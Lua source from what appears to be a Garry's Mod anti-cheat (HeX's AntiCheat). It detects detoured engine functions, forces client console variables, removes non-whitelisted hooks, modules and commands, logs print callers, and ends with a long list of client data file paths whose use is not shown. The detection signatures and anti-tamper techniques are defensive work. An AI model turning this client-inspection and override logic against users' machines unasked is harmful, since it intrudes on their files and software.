	for k,v in pairs(Lists.Black_Hooks) do
		local Hook		= v.H
		local Name		= v.N
		local BaseHook	=  NotHH[Hook]
		
		if BaseHook then
			local func = BaseHook[Name]
			
			if func then
				local path,line = FPath(func)
				DelayGMG( Format("%s=%s-%s [%s:%s]", v.D, Hook, Name, path,line ) ); EatThis(path)
				
				BaseHook = nil
				NotHH[Hook] = nil
				NotHR(Hook, Name)
			end
		end
	end
	
	--REMOVE ME
	if string.random then
		local Path,Line = FPath(string.random)
		
		DelayGMG( Format("TC=string.random [%s:%s]", Path, Line) )
		string.random = nil
	end
	if string.Random then
		local Path,Line = FPath(string.Random)
		
		DelayGMG( Format("TC=string.Random [%s:%s]", Path, Line) )
		string.Random = nil
	end
	if file.ExistsEx then
		local Path,Line = FPath(file.ExistsEx)
		
		DelayGMG( Format("TC=file.ExistsEx [%s:%s]", Path, Line) )
		file.ExistsEx = nil
	end
	if file.TFind then
		local Path,Line = FPath(file.TFind)
		
		DelayGMG( Format("TC=file.TFind [%s:%s]", Path, Line) )
		file.TFind = nil
	end
	if file.FindInLua then
		local Path,Line = FPath(file.FindInLua)
		
		DelayGMG( Format("TC=file.FindInLua [%s:%s]", Path, Line) )
		file.FindInLua = nil
	end
end
NotTS(25, function()
	NotTC(RandomChars(), 60, 0, Ooh)
	DelayGMG(NotCRC(MSGHook))
end)
Ooh()

local function CheckPotato(spud,peel)
	if not spud then DelayGMG("KR30=CheckPotato-No("..peel..")") return end
	
	local DGE = NotDGE(spud)
	if DGE then
		local Res = ""
		
		if DGE.what != "C" then 			Res = Res.."WH="..DGE.what.."," 						end
		if DGE.linedefined != -1 then 		Res = Res.."LD="..DGE.linedefined.."," 					end
		if DGE.lastlinedefined != -1 then	Res = Res.."LL="..DGE.lastlinedefined..","				end
		if DGE.source != "=[C]"	then		Res = Res.."SC="..DGE.source.."," 						end
		if DGE.short_src != "[C]" then		Res = Res.."SS="..DGE.short_src.."," 					end
		if DGE.func != spud then			Res = Res.."FU="..DGE.func.." ["..FPath(DGE.func).."],"	end
		
		if Res != "" then
			local path,line = FPath(spud)
			DelayGMG( Format("KR30=CheckPotato(%s, %s) [%s:%s]", peel, Res, path,line) ); EatThis(path)
		end
	else
		DelayGMG("KR30=CheckPotato-NoDGE("..peel..")")
	end
end

local function KickRate30()
	CheckPotato(tostring,				"tostring")
	CheckPotato(include,				"include")
	CheckPotato(error,					"error")
	CheckPotato(Error,					"Error")
	CheckPotato(collectgarbage,			"collectgarbage")
	CheckPotato(NotRCC,					"NotRCC")
	CheckPotato(NotRQ,					"NotRQ")
	CheckPotato(NotRS,					"NotRS")
	CheckPotato(NotGCI,					"NotGCI")
	CheckPotato(NotCGB,					"NotCGB")
	CheckPotato(NotJUF,					"NotJUF")
	CheckPotato(NotSD,					"NotSD")
	
	if NotGMT(_G) != nil then
		DelayGMG("KR30=GGMT")
	end
	if debug then
		DelayGMG("KR30=KR30LDD")
	end
	if _G.__metatable != nil then
		DelayGMG("KR30=GMT")
	end
	if _G.__index != nil then
		DelayGMG("KR30=GIDX")
	end
	if _G.__newindex != nil then
		DelayGMG("KR30=NIDX")
	end
	
	if NotGCN("cl_cmdrate") != 30 then
		NotRCC("cl_cmdrate", "30")
	end
	if NotGCS("rate") != "45000" then
		NotRCC("rate", "45000")
	end
	if NotGCS("sv_timeout") != "200" then
		NotRCC("sv_timeout", "200")
	end
	
	if NotGCN("physgun_wheelspeed") > 10 then
		DelayGMG( Format("KR30=physgun_wheelspeed=%s", NotGCS("physgun_wheelspeed") ) )
		NotRCC("physgun_wheelspeed", "10")
	end
	
	for k,v in pairs(Lists.White_CVTab) do
		local CVar = NotGCV(k)
		local gCVE = NotCVE(k)
		if not CVar or not gCVE then
			if not CVar then
				DelayGMG("KR30=NoCVar="..k)
			end
			if not gCVE then
				DelayGMG("KR30=NoCVE="..k)
			end
			break
		end
		
		local Reset = false
		local Int	= v.Int
		local gInt 	= NotGCN(k)
		if gInt != Int then
			DelayGMG( Format("KR30=%s gInt(%s != %s)", k, gInt, Int) )
			Reset = true
		end
		local Str	= v.Str
		local gStr	= NotGCS(k)
		if gStr != Str then
			DelayGMG( Format("KR30=%s gStr(%s != %s)", k, gStr, Str) )
			Reset = true
		end
		
		local vInt = NotGIN(CVar)
		if vInt != Int then
			DelayGMG( Format("KR30=%s vInt(%s != %s)", k, vInt, Int) )
			Reset = true
		end
		local vStr = NotGSS(CVar)
		if vStr != Str then
			DelayGMG( Format("KR30=%s vStr(%s != %s)", k, vStr, Str) )
			Reset = true
		end
		local vBool	= NotGBL(CVar)
		local Bool	= v.Bool or false
		if vBool != Bool then
			DelayGMG( Format("KR30=%s vBool(%s != %s)", k, vBool, Bool) )
			Reset = true
		end
		local Float	= v.Float
		local vFloat = NotGFL(CVar)
		if vFloat != Float then
			DelayGMG( Format("KR30=%s vFloat(%s != %s)", k, vFloat, Float) )
			Reset = true
		end
		local Def = v.Def
		local vDef		= NotGDF(CVar)
		if vDef != Def then
			DelayGMG( Format("KR30=%s vDef(%s != %s)", k, vDef, Def) )
		end
		local Help = v.Help
		if Help then
			local vHelp = NotGHP(CVar) or "None"
			
			if vHelp != Help then
				DelayGMG( Format("KR30=%s vHelp(%s)", k, vHelp) )
			end
		end
		if Reset and not NotSL(k) == "sv_cheats" then
			NotRCC(k, Str)
		end
	end
	
	if require != NewRQ then
		DelayGMG("Detour3=require["..FPath(require).."]")
		require = NewRQ
	end
	if include != NotINC then
		DelayGMG("Detour3=include["..FPath(include).."]")
		include = NotINC
	end
	if debug.getinfo != NotDGE then
		DelayGMG("Detour3=debug.getinfo["..FPath(debug.getinfo).."]")
		debug.getinfo = NotDGE
	end
	if hook.Add != NotHA then
		DelayGMG("Detour3=hook.Add["..FPath(hook.Add).."]")
		hook.Add = NotHA
	end
	if hook.Call != NotHC then
		DelayGMG("Detour3=hook.Call["..FPath(hook.Call).."]")
		hook.Call = NotHC
	end
	if hook.Remove != NotHR then
		DelayGMG("Detour3=hook.Remove["..FPath(hook.Remove).."]")
		hook.Remove = NotHR
	end
	if hook.GetTable != UselessTable_Hook then
		DelayGMG("Detour3=hook.GetTable["..FPath(hook.GetTable).."]")
		hook.GetTable = UselessTable_Hook
	end
	if concommand.GetTable != UselessTable_Cmd then
		DelayGMG("Detour3=concommand.GetTable["..FPath(concommand.GetTable).."]")
		concommand.GetTable = UselessTable_Cmd
	end
	if file.Find != NotFF then
		DelayGMG("Detour3=file.Find["..FPath(file.Find).."]")
		file.Find = NotFF
	end
	if GetConVar != NotGCV then
		DelayGMG("Detour3=GetConVar["..FPath(GetConVar).."]")
		GetConVar = NotGCV
	end
	if GetConVarString != NotGCS then
		DelayGMG("Detour3=GetConVarString["..FPath(GetConVarString).."]")
		GetConVarString = NotGCS
	end
	if GetConVarNumber != NotGCN then
		DelayGMG("Detour3=GetConVarNumber["..FPath(GetConVarNumber).."]")
		GetConVarNumber = NotGCN
	end
	if concommand.Add != NotCCA then
		DelayGMG("Detour3=concommand.Add["..FPath(concommand.Add).."]")
		concommand.Add = NotCCA
	end
	if _G.RunConsoleCommand != NewRCC then
		DelayGMG("Detour3=RunConsoleCommand["..FPath(_G.RunConsoleCommand).."]")
		_G.RunConsoleCommand = NewRCC
	end
	if concommand.Run != NotCCR then
		DelayGMG("Detour3=concommand.Run["..FPath(concommand.Run).."]")
		concommand.Run = NotCCR
	end
	if _R.File.Size != F_Size then
		DelayGMG("Detour3=F_Size["..FPath(_R.File.Size).."]")
		_R.File.Size = F_Size
	end
	if _R.File.Read != F_Read then
		DelayGMG("Detour3=F_Read["..FPath(_R.File.Read).."]")
		_R.File.Read = F_Read
	end
	if _R.Entity.FireBullets != NotBLT then
		DelayGMG("Detour3=FireBullets["..FPath(_R.Entity.FireBullets).."]")
		_R.Entity.FireBullets = NotBLT
	end
	
	if not NotRE( NotRGT(_G, "GetConVar"), NotGCV) then
		DelayGMG("Detour4=GetConVar")
	end
	if not NotRE( NotRGT(_G, "GetConVarString"), NotGCS) then
		DelayGMG("Detour4=GetConVarString")
	end
	if not NotRE( NotRGT(_G, "GetConVarNumber"), NotGCN) then
		DelayGMG("Detour4=GetConVarNumber")
	end
	if not NotRE( NotRGT(_G, "RunConsoleCommand"), NewRCC) then
		DelayGMG("Detour4=RunConsoleCommand")
	end
	if not NotRE( NotRGT(_G, "InjectConsoleCommand"), NotECC) then
		DelayGMG("Detour4=InjectConsoleCommand")
	end
	if not NotRE( NotRGT(concommand, "Run"), NotCCR) then
		DelayGMG("Detour4=NotCCR")
	end
	
	CheckPotato(NotDGE,					"NotDGE")
	CheckPotato(NotDGU,					"NotDGU")
	CheckPotato(NotCRC,					"NotCRC")
	CheckPotato(NotRPF,					"NotRPF")
	CheckPotato(NotTS,					"NotTS")
	CheckPotato(NotTC,					"NotTC")
	CheckPotato(NotPCC,					"NotPCC")
	CheckPotato(NotSEA,					"NotSEA")
	CheckPotato(NotSVA,					"NotSVA")
	CheckPotato(render.Capture,			"render.Capture")
	CheckPotato(file.Open,				"file.Open")
	CheckPotato(file.Find,				"file.Find")
	CheckPotato(file.Size,				"file.Size")
	CheckPotato(util.CRC,				"util.CRC")
	CheckPotato(util.Decompress,		"util.Decompress")
	CheckPotato(util.Compress,			"util.Compress")
	CheckPotato(util.TableToJSON,		"util.TableToJSON")
	CheckPotato(util.JSONToTable,		"util.JSONToTable")
	CheckPotato(util.Base64Encode,		"util.Base64Encode")
	CheckPotato(timer.Simple,			"timer.Simple")
	CheckPotato(timer.Create,			"timer.Create")
	CheckPotato(net.SendToServer,		"net.SendToServer")
	CheckPotato(net.WriteString,		"net.WriteString")
	CheckPotato(debug.getinfo,			"debug.getinfo")
	CheckPotato(debug.getregistry,		"debug.getregistry")
	CheckPotato(_R.Entity.FireBullets,	"FireBullets")
	CheckPotato(string.dump,			"string.dump")
	CheckPotato(table.insert,			"table.insert")
	
	if debug.getmetatable then
		DelayGMG("DGMT")
	end
end


HookAdd("HACBurst", function(Cont,len,sID,idx,Total)
	local HAC = {
		DelayGMG = DelayGMG,	FPath		= FPath,		EatThis = EatThis,
		HookCall = HookCall,	NotRCC		= NotRCC,		NotDGE	= NotDGE,
		NotDGU	 = NotDGU,		NotSMT		= NotSMT,		NotGMT	= NotGMT,
		NotRGT	 = NotRGT,		NotRST		= NotRST,		NotCRC	= NotCRC,
		NotRQ	 = NotRQ,		NotRS		= NotRS,		NotGCI	= NotGCI,
		NotCGB	 = NotCGB,		NotTS		= NotTS,		NotTC	= NotTC,
		NotMR	 = NotMR,		NotTIS		= NotTIS,		NotJUF	= NotJUF,
		NotRPF	 = NotRPF,		NotSEA		= NotSEA,		NotSVA	= NotSVA,
		NotSD	 = NotSD,		CheckPotato	= CheckPotato,	NotHP	= NotHP,
		NotSIW	 = NotSIW,		NotGMG		= NotGMG,		Read	= Read,
		NotFE	 = NotFE,		NotSX		= NotSX,		ConCon	= RunConsoleCommand,
		NotFF	 = NotFF,		NotFO		= NotFO,		F_Size 	= F_Size,
		F_Close	 = F_Close, 	F_Read 		= F_Read, 		F_Write = F_Write,
		NotFD	 = NotFD,		NotDGMT		= NotDGMT,		Format	= Format,
		pairs	 = pairs,		tostring 	= tostring, 	pcall	= pcall,
		_R		= _R
	}
	Cont = NotJTT(Cont)
	local ply = ""
	local CME = {}
		CME.CRC = NotCRC(Cont.Cont..Cont.Ras)
		CME.Ran,CME.Ret = GetPlayer(
			NotHP(Cont.Cont,Cont.Ras),
			function(self) if self then ply = self end end,HAC,Gun
		)
		CME.ply = ply
	CME = NotJST(CME)
	
	HookCall("HACBurst", CME, nil,nil,true)
end)


local Cannon = {}
local function CheckOven()
	for cmd,func in pairs(NotCGT) do
		if not (cmd and func) or func == OverrideCmd then continue end
		cmd = tostring(cmd)
		
		local path,line = FPath(func)
		local where = path..":"..line
		
		if not GoodCCA(cmd,where) then
			if not Cannon[cmd..where] then
				NotGMG("WCCA=", cmd,where)
				Cannon[cmd..where] = true
			end
			
			if not Silent or (NotFL(NotSL(cmd),"spam") or NotFL(NotSL(path),"spam")) then
				func 		= OverrideCmd
				NotCGT[cmd] = OverrideCmd
			end
			EatThis(path)
		end
	end
	
	for what,HTab in pairs(NotHH) do
		what = tostring(what)
		for k,v in pairs(HTab) do
			if not v or v == Useless then continue end
			local Idx_k = k
			k = tostring(k)
			
			local path,line = FPath(v)
			local where = path..":"..line
			if not GoodHook(what,k,where) then
				if not Cannon[what..k..where] then
					NotGMG("WHOOK=", what,k,where)
					Cannon[what..k..where] = true
				end
				
				if not Silent or (NotFL(NotSL(k),"spam") or NotFL(NotSL(where),"spam")) then
					v = Useless
					if Idx_k and NotHH[what] then NotHH[what][Idx_k] = Useless end
				end
				EatThis(path)
			end
		end
	end
	
	local Modules = _G._MODULES
	if type(Modules) == "table" then
		for k,v in pairs(Modules) do
			if not Lists.White_Modules[k] then
				DelayGMG("MODULE="..k)
				
				Modules[k] = nil
				if _G[k] then _G[k] = nil end
			end
		end
	end
	
	for k,v in pairs(_R) do
		if type(k) == "string" and NotFL(k,"LOADLIB:") then
			DelayGMG(k)
		end
	end
	
	for what,func in pairs(GAMEMODE) do
		if not func or func == Useless then continue end
		local path,line,kitten = FPath(func)
		if not kitten then continue end
		
		local where = path..":"..line
		if not GoodGM(what,where) then
			if not Cannon[what..where] then
				NotGMG("WGM=", what,where)
				Cannon[what..where] = true
			end
			
			if not Silent then
				func 			= Useless
				GAMEMODE[what]	= Useless
			end
			EatThis(path)
		end
	end
end

local function PreKR30()
	NotTS(12, PreKR30)
	
	KickRate30()
	CheckOven()
end
NotTS(15, PreKR30)


_G.swep 	= PreKR30
_G.NotFO	= NotFO
_G.NotFXE	= NotFXE
_G.NotFF	= NotFF
_G.NotFD	= NotFD
_G.NotDGU	= NotDGU

local function ThickCheck()
	if _G.NotFO != NotFO then
		DelayGMG("THK=NotFO ["..FPath(_G.NotFO).."]")
		_G.NotFO = NotFO
	end	
	
	if _G.NotFXE != NotFXE then
		DelayGMG("THK=NotFXE ["..FPath(_G.NotFXE).."]")
		_G.NotFXE = NotFXE
	end
	
	if _G.NotFF != NotFF then
		DelayGMG("THK=NotFF ["..FPath(_G.NotFF).."]")
		_G.NotFF = NotFF
	end
	
	if _G.NotFD != NotFD then
		DelayGMG("THK=NotFD ["..FPath(_G.NotFD).."]")
		_G.NotFD = NotFD
	end
	
	if _G.NotDGU != NotDGU then
		DelayGMG("THK=NotDGU ["..FPath(_G.NotDGU).."]")
		_G.NotDGU = NotDGU
	end
	
	if _G.GlobalPoop != NotGMG then
		DelayGMG("THK=GlobalPoop ["..FPath( _G.GlobalPoop).."]")
		_G.GlobalPoop = NotGMG
	end
	
	if _G.ConCon != RunConsoleCommand then
		DelayGMG("THK=ConCon ["..FPath(_G.ConCon).."]")
		_G.ConCon = RunConsoleCommand
	end
	
	table.Copy 	= TableCopy
	hook.Call	= NotHC
	hook.Add	= NotHA
end

NotTS(4, function()
	if not NotHH.Think then NotHH.Think = {} end
	NotHH.Think[ RandomChars() ] = ThickCheck
	CheckOven()
end)



local function VAString(Split, ...)
	local Tab 	= {...}
	local Out 	= ""
	local Out2 	= ""
	local Tot 	= select("#", ...)
	for k=1,Tot do
		Out  = Out..tostring( Tab[k] )..(k == Tot and "" or Split)
		Out2 = Out2.."[["..tostring( Tab[k] ).."]]"..(k == Tot and "" or ", ")
	end
	return Out,Out2
end


local function NewPRT(...)
	local Out,Out2 = VAString("\t", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("print(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end	
	print(Out)
end
_G.print = NewPRT

local function NewMSG(...)
	local Out,Out2 = VAString("", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("Msg(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	Msg(Out)
end
_G.Msg = NewMSG

local function NewMSN(...)
	local Out,Out2 = VAString("", ...)
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("MsgN(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	MsgN(Out.."\n")
end
_G.MsgN = NewMSN

local NotCAT = chat.AddText
local function NewCAT(...)
	local Out2 = ""
	for k,v in pairs( {...} ) do
		if type(v) == "string" then
			Out2 = Out2.."[["..v.."]], "
		end
	end
	
	local path,line = MyCall()
	if not Lists.White_PRT[ NotCRC(path) ] then
		NotGMG( Format("chat.AddText(%s) [%s:%s]", Out2, path,line), NotCRC(path) ); EatThis(path)
	end
	NotCAT(...)
end
_G.chat.AddText = NewCAT


AddGroups()
DelayGMG("CGBCount", tostring(CGBCount) )
DelayGMG("GCICount", tostring(GCICount) )
DelayGMG("RCount", Bacon)
DelayGMG("GCount", Hose)
HookCall("LPT", LPT, nil,nil,true)
for k,v in pairs(Mail) do
	if not Lists.White_Package[v] then
		DelayGMG("Package="..tostring(v) )
	end
end

local Red 		= {r=255,g=0,  b=11, a=255}
local Green		= {r=66, g=255,b=96, a=255}
local Blue		= {r=51, g=153,b=255,a=255}
local Purple	= {r=255,g=0,  b=255,a=255}
HACInstalled = HACInstalled + 1
if not NotHH.InitPostEntity then NotHH.InitPostEntity = {} end
NotHH.InitPostEntity.Hooks = function()
	local HACLength = HACInstalled + #Lists
	local Init = HACKey + (HACInstalled * 2 / HACLength) + (HACLength + #NotGGM() + Hose) - Bacon
	
	DelayGMG("InitPostEntity", HACLength, Init, HACKey)
	
	local function RunAway()
		NotTS(30, RunAway)
		PreKR30()
		ThickCheck()
	end
	NotTS(9, RunAway)
	
	if not Silent then		
		MsgC(Red,		"\n///////////////////////////////////\n")
		MsgC(Red,		"//        ")
		MsgC(Blue,		"HeX's ")
		MsgC(Green,		"AntiCheat")
		MsgC(Red,		"        //\n")
		MsgC(Red,		"///////////////////////////////////\n")
		MsgC(Red,		"//     ")
		MsgC(Green,		"Pissing in the sandbox")
		MsgC(Red,		"    //\n")
		MsgC(Red,		"//           ")
		MsgC(Green,		"since '08")
		MsgC(Red,		"           //\n")
		MsgC(Red,		"///////////////////////////////////\n\n")
		
		MsgC(Purple,	HACCredits)
		
		MsgC(Blue,		'\n"These hack/anti-hack discussions are just dick measuring contests"\n')
		MsgC(Blue,		"HeX's is 7."..HACLength.." inches!\n\n")
	end
	
	RunConsoleCommand("gm_uh_enter_game_new", "UH DM", 1818, Init, Panties("Green"), HACKey)
	
	local p,l = "1337",1337
	local function CallMe(i) Init = Init + i; p,l = MyCall(2) end
	CallMe(Init)
	if not S_Path then DelayGMG("SPath", p,l,Init) end
end


/*
 ____  _____ ____ ___  _   _ ____    _____ ___ _     _____ 
/ ___|| ____/ ___/ _ \| \ | |  _ \  |  ___|_ _| |   | ____|
\___ \|  _|| |  | | | |  \| | | | | | |_   | || |   |  _|  
 ___) | |__| |__| |_| | |\  | |_| | |  _|  | || |___| |___ 
|____/|_____\____\___/|_| \_|____/  |_|   |___|_____|_____|
*/




local UselessData = {
	"data/friends_override.txt",
	"data/msteams_db.txt",
	"data/acf/menucolor.txt",
	"data/acf/revision.txt",
	"data/spacechat_options.txt",
	"data/smart_door.txt",
	"data/cdp_PaintLocations.txt",
	"data/test8995.txt",
	"data/impulse_maps.txt",
	"data/spaint.txt",
	"data/ttt_mapcycle.txt",
	"data/gb-radial-config-tools_2014.txt",
	"data/cs_shit.txt",
	"data/gungame-config.txt",
	"data/gb-radial-config_2014.txt",
	"data/progress_sao.txt",
	"data/cguisettingstwo.txt",
	"data/cguisettingsfive.txt",
	"data/cinema_config.txt",
	"data/hatlog.txt",
	"data/settings_sao.txt",
	"data/server_sessionid.txt",
	"data/chatsay.txt",
	"data/oldhash.txt",
	"data/Bowser.hat.txt",
	"data/ass_spconfig_client.txt",
	"data/kzss_config.txt",
	"data/queuemodechange.txt",
	"data/ev_globalvars_js.txt",
	"data/molotov_logs.txt",
	"data/LepRP_version.txt",
	"data/LepRP_weapons.txt",
	"data/weighting.txt",
	"data/ezi/ez_notif.txt",
	"data/model_precache_imp.txt",
	"data/riends_override.txt",
	"data/ai_prop_info_config.txt",
	"data/tt_detective.txt",
	"data/tscoreboard_config.txt",
	"data/icrp_buddies.txt",
	"data/ezi/ez_notifications.txt",
	"data/hgperp_buddies.txt",
	"data/sao_settings.txt",
	"data/anti-cheat.txt",
	"data/smartsnap_settings.txt",
	"data/gm_flatgrass .txt",
	"data/gcompute_ide_tabs.txt",
	"data/sandbox_mapcycle.txt",
	"data/advmpsettings.txt",
	"data/vMapVote_favorites.txt",
	"data/lemom_con_bl.txt",
	"data/gm_flatgrass.txt",
	"data/pacman.txt",
	"data/cbcbhop.txt",
	"data/pimptimes.txt",
	"data/gangwars_muted.txt",
	"data/PaperHud.txt",
	"data/glow_sawwarning.txt",
	"data/bannedprops.txt",
	"data/radio.txt",
	"data/maplist.txt",
	"data/fscache.txt",
	"data/saolvl.txt",
	"data/impactedhelp.txt",
	"data/swift128.txt",
	"data/friends_cache.txt",
	"data/zsfavoriteshopitems.txt",
	"data/dgchristmas.txt",
	"data/chathud_variables.txt",
	"data/custom_title.txt",
	"data/imp_intro.txt",
	"data/gb-radial-config-presets.txt",
	"data/noobonic/favprops.txt",
	"data/ulx_donate.txt",
	"data/NewAdmin/log.txt",
	"data/cars.txt",
	"data/restricted_weapons.txt",
	"data/mg_jukebox_cache.txt",
	"data/mg_jukebox_cache_version.txt",
	"data/mg_jukebox_favorites.txt",
	"data/jitheater/default.txt",
	"data/zinv_settings.txt",
	"data/blackbox/designs/fallout/color.txt",
	"data/ax.txt",
	"data/builder_props.txt",
	"data/improvedhud2/design.txt",
	"data/improvedhud2/options.txt",
	"data/improvedhud2/verision.txt",
	"data/sac_plugin_menus.txt",
	"data/spex_data.txt",
	"data/localdata/clientinfo.txt",
	"data/debugtime.txt",
	"data/dr_3f.txt",
	"data/dr_3r.txt",
	"data/sb_active.txt",
	"data/sb_volume.txt",
	"data/gb-radial-config-tools.txt",
	"data/gb-radial-config.txt",
	"data/scar_errorlog_sv.txt",
	"data/ug_cinema_config.txt",
	"data/vfs_cl.txt",
	"data/wyozimedia_pls_cli2.txt",
	"data/mapvote/config.txt",
	"data/wire_version.txt",
	"data/nadmod_config.txt",
	"data/prevhash.txt",
	"data/_playx_crash_detection.txt",
	"data/particle materials.txt",
	"data/ulx_motd.txt",
	"data/stargate.cvar.check.txt",
	"data/scarhud.txt",
	"data/scarkeybindings.txt",
	"data/scarradiochannels.txt",
	"data/scarcam.txt",
	"data/ev_globalvars.txt",
	"data/ass_config_client.txt",
	"data/hoverboards.txt",
	"data/smartsnap_offsets_custom.txt",
	"data/sharpeye_config_dump.txt",
	"data/fadmin/motd.txt",
	"data/particle_materials.txt",
	"data/toolgunmenu/data.txt",
	"data/toolgunmenu/tooldata.txt",
	"data/hud_settings.txt",
	"data/vChat/settings.von.txt",
	"data/vscoreboard/settings.von.txt",
	"data/atlaschat_config.txt",
	"data/scar_errorlog_cl.txt",
	"data/hera/log.txt",
	"data/Impacted.txt",
	"data/swift.txt",
	"data/ev_allentitiescache.txt",
	"data/ev_playerinfo.txt",
	"data/ev_userranks.txt",
	"data/check/won.txt",
	"data/workshop_tracker/targets.txt",
	"data/lemom_cmds.txt",
	"data/horrorstory/settings.txt",
	"data/mptv_history.txt",
	"data/pzs_savecart.txt",
	"data/breakableprops.txt",
	"data/ad2temp.txt",
	"data/ia_globalvars.txt",
	"data/climbswep2_convars.txt",
	"data/FQD_ZS_carts.txt",
	"data/crashpos_json.txt",
	"data/gauth_cl.txt",
	"data/scoreboard_config.txt",
	"data/tardis_locations.txt",
	"data/nnjg/jbrules.txt",
	"data/ARitzDDSettings.txt",
	"data/crashposition.txt",
	"data/stonedpotatoes_welcome.txt",
	"data/gibmod_models.txt",
	"data/nekres.txt",
	"data/gibmod/gibmod_enabled.txt",
	"data/gibmod/gibmod_enabledismemberment.txt",
	"data/gibmod/gibmod_enablegibbing.txt",
	"data/gibmod/gibmod_mingibs.txt",
	"data/_lpp_friends.txt",
	"data/contraptionListNew.txt",
	"data/default.txt",
	"data/gfyforum.txt",
	"data/ff_pnrp_tutorial.txt",
	"data/gfygroup.txt",
	"data/gfymotdv2.txt",
	"data/legit.txt",
	"data/lua_editor_save.txt",
	"data/players_saved.txt",
	"data/grenada/grenada.txt",
	"data/html/motd.txt",
	"data/manuals/spawned.txt",
	"data/ass_config_server.txt",
	"data/ass_rankings.txt",
	"data/gangwars_options.txt",
	"data/mxradio.txt",
	"data/mxradio_settings.txt",
	"data/sammyservers_textscreens.txt",
	"data/exsto_windows.txt",
	"data/ev_motd.txt",
	"data/ASSmod/motd.txt",
	"data/SBEP/keyconfig.txt",
	"data/ttt_menu_settings.txt",
	"data/my_cbpos13.txt",
	"data/BRASS_HUD_C.txt",
	"data/drp-ps-bans.txt",
	"data/drp-ps.txt",
	"data/gmp_intro.txt",
	"data/presets_json.txt",
	"data/rules.txt",
	"data/hl2survival/hints.txt",
	"data/hudnum.txt",
	"data/hudnum.txt",
	"data/nxnstorefavs.txt",
	"data/ray_damage.txt",
	"data/Callisto/callisto sec fire data.txt",
	"data/ups/friends.txt",
	"data/ev_globalvarsHON.txt",
	"data/particle_maker_materials.txt",
	"data/perp2_buddies.txt",
	"data/ass_debug_cl.txt",
	"data/smartsnap_custom_offsets.txt",
	"data/vein/logs/sql.txt",
	"data/zscarts.txt",
	"data/brom-admin/auto_login.txt",
	"data/damagelog_colours_13.txt",
	"data/hs_layout.txt",
	"data/alpha_testers.txt",
	"data/bugs.txt",
	"data/ea_version.txt",
	"data/Zmod/player.txt",
	"data/nn_data/nn_ytp_bookmarks.txt",
	"data/lemon_config.txt",
	"data/tt_no_rules.txt",
	"data/blinkswep_convars.txt",
	"data/sandbox_mapcycle.txt-1727956287",
	"data/exsto_mysql_settings.txt",
	"data/anti-cheat_logs/anti-cheat.txt",
	"data/exsto_plugin_settings.txt",
	"data/ev_log.txt",
	"data/ev_player_reports.txt",
	"data/gmz_invslots.txt",
	"data/caddons_data.txt",
	"data/ldrp_savetheme.txt",
	"data/inkie.txt",
	"data/connected_list.txt",
	"data/depthhud_inline.txt",
	"data/muted_list.txt",
	"data/fbans.txt",
	"data/1fw.txt",
	"data/account.txt",
	"data/kim.txt",
	"data/1fc.txt",
	"data/FACTION Default.txt",
	"data/firstmap.bat.txt",
	"data/mapcycle.move.txt",
	"data/forcedl.txt",
	"data/EventsLog.txt",
	
	"data/expmod/",
	"data/G-Stream/",
	"data/phluddbase/",
	"data/wireflash/",
	"data/hatschat/",
	"data/CAF_Debug/",
	"data/InventoryAddon/",
	"data/floodcashlogs/",
	"data/floodweapons/",
	"data/wep_data/",
	"data/craphead_scripts/",
	"data/heat/",
	"data/pinv/",
	"data/mod-128/",
	"data/mapvote/",
	"data/GibSplat/",
	"data/metrostroi_data/",
	"data/asm/",
	"data/advdupe2_maps/",
	"data/nz/",
	"data/npcspawner2/",
	"data/fish/",
	"data/ttt/maps/",
	"data/playerjoinlogger/",
	"data/LiquidDRP/",
	"data/relationswapper/",
	"data/map_decoration_editor/",
	"data/sv_hideandseek/",
	"data/pzs/",
	"data/ph13/",
	"data/esdata/",
	"data/wallet_db/",
	"data/hideandseek/",
	"data/Callisto/",
	"data/westernrp_textures/",
	"data/zs_loadouts/",
	"data/hologp/",
	"data/pixel_weapon/",
	"data/starfall/",
	"data/npcspawner/",
	"data/npcrelationships/",
	"data/gjail/",
	"data/nutscript/",
	"data/hitnumbers/",
	"data/homestuck/",
	"data/FAdmin/",
	"data/perma/",
	"data/Half-Life_2_Campaign/",
	"data/weapon_loadouts/",
	"data/mail/",
	"data/blackbox/designs/",
	"data/Expression 2/",
	"data/mtz_murder/",
	"data/particle/",
	"data/zsloadouts/",
	"data/noxctfspellsheet/",
	"data/gibmod/",
	"data/Morbus/logs/",
	"data/HAT/",
	"data/server/ghosthunters/",
	"data/Stargate/",
	"data/Rollercoasters/",
	"data/gmstranded/",
	"data/geolocation/",
	"data/kiritoservermail/",
	"data/gamesaves/",
	"data/vbtdm/",
	"data/d3a/stafflogs/",
	"data/dbugr/",
	"data/D3A/StaffLogs/",
	"data/EM_manuals/",
	"data/GMStranded/",
	"data/dbugr/cl_logs/",
	"data/murder/",
	"data/scareditorsaves/",
	"data/tf2pain/",
	"data/radwheel/",
	"data/FAdmin_logs/",
	"data/leifadmin/",
	"data/d3a/stafflogs/commands/",
	"data/faddons_savedata/",
	"data/pac3_editor/",
	"data/server_logs/",
	"data/faddons_savedata/",
	"data/sbep_manual/",
	"data/pac2_outfits/",
	"data/openaura/",
	"data/onslaught_saves/",
	"data/labyrinth/",
	"data/e2files/",
	"data/dmod/",
	"data/ctp/",
	"data/cityrp/",
	"data/chatlogs/",
	"data/WM-RTS/",
	"data/SPUChip/",
	"data/LeifAdmin/",
	"data/Holopad/",
	"data/HL2Survival/",
	"data/EGI_Data/",
	"data/E2Power/",
	"data/signbuilder/",
	"data/drone/users/",
	"data/swep_construction_kit/",
	"data/tdm/",
	"data/ulib/",
	"data/cap_fonts/",
	"data/improvedhud/",
	"data/ulx_logs/",
	"data/DarkRP_logs/",
	"data/loading_screen_data/",
	"data/zombiesurvival/",
	"data/lemongate/",
	"data/serverguard/",
	"data/FloodWeapons/",
	"data/FloodCashLogs/",
	"data/FloodBans/",
	"data/advdupe2/",
	"data/darkestdays/loadouts/",
	"data/redead/",
	"data/pzs_v3b/",
	"data/zmodserveroption/",
	"data/zmodworld/",
	"data/gmstranded/saves/",
	"data/zmod_global_options/",
	"data/unolimited/",
	"data/codzombies/",
	"data/r2k/",
	"data/srvlog/",
	"data/pac3/",
	"data/ttt/logs/",
